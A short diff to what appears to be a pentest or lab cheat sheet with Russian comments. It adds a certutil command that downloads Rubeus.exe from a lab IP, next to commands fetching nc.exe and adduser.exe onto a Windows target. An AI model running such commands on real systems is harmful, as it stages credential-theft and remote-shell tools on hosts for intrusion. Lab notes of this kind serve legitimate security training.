@@ -85,6 +85,7 @@ iwr -uri http://192.168.x.xx/adduser.exe -OutFile adduser.exe
 
 certutil.exe -f -split -urlcache http://ip/nc.exe c:\windows\temp\nc.exe
 
+certutil -urlcache -f http://10.10.14.15:8001/Rubeus.exe Rubeus.exe
 
 # Поднять NetCAt
 
